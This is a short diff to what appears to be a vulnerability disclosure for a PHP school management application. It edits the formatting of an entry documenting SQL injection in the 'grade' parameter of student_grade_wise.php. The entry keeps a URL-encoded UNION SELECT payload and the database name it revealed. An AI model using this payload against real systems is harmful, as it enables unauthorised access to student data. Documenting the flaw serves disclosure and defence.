@@ -14,9 +14,7 @@
 
 **[+] Payload:** /school/view/student_grade_wise.php?grade=11'%20union%20select%20database()%2c2%2c3%3b%23
 
-**Leak place** : grade
-
-**the sql injection is：**11' union select database(),2,3;#
+​	Leak place : grade
 
 **Current database name:** std_db, length is 6
 
